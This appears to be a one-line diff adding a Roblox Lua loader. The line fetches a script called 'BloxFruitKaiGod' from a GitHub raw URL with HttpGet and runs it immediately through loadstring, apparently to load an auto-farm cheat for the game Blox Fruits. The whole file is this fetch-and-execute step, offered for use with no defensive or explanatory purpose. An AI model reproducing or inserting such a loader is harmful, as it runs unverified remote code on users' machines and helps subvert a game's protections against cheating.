@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MosHubLoader/MosKaitun/refs/heads/main/BloxFruitKaiGod"))()
